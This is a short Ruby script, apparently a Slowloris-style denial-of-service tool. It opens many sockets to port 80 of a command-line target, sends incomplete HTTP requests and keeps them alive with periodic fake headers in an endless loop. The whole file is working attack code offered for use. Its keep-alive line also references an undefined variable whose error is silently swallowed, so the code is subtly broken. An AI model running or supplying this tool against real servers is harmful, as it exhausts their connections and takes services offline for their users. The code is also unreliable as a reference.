require "socket"

def init_socket(target)
  #socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)
  socket = Socket.new(:INET, :STREAM)
  socket_address = Socket.pack_sockaddr_in(80, target)
  socket.connect(socket_address)

  socket.write(("GET /?%{n} HTTP/1.1\r\n" % { n: $prng.rand(2000) }).encode("utf-8"))
  
  # headers
  $regular_headers.each { |h|
    socket.write("#{h}\r\n".encode("utf-8"))
  }
  
  return socket
end

def main
  target = ARGV[0]
  socket_count = ARGV[1].to_i
  
  puts("Attacking #{target} with #{socket_count} sockets.")
  
  # creates sockets for the 1st time
  puts("Creating sockets...")
  for i in (1..socket_count)
    begin
      puts("Creating socket \##{i}")
      s = init_socket(target)
    rescue
      break;
    end
    $sockets << s
  end
  
  while true
    # sends keep-alive header to each
    puts("Sending keep-alive headers... Socket count: #{$sockets.size}")
    $sockets.each { |s|
      begin
        s.write(("X-a: #{n}\r\n" % { n: $prng.rand(4999)+1 }).encode("utf-8"))
      rescue
        $sockets.delete(s)
      end            
    }
    
    # recreates dead sockets
    for i in (1..(socket_count - $sockets.size))
      puts("Recreating socket...")
      begin
        s = init_socket(target)
        $sockets << s if s
      rescue
        break
      end      
    end
    
    # sleeps for a while
    sleep(15)
  end
end

$prng = Random.new(1234)
$sockets = [] # my array of sockets
$regular_headers = [
  "User-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:36.0) Gecko/20100101 Firefox/36.0.4 Waterfox/36.0.4",
  "Accept-language: en-US,en,q=0.5"
]

main()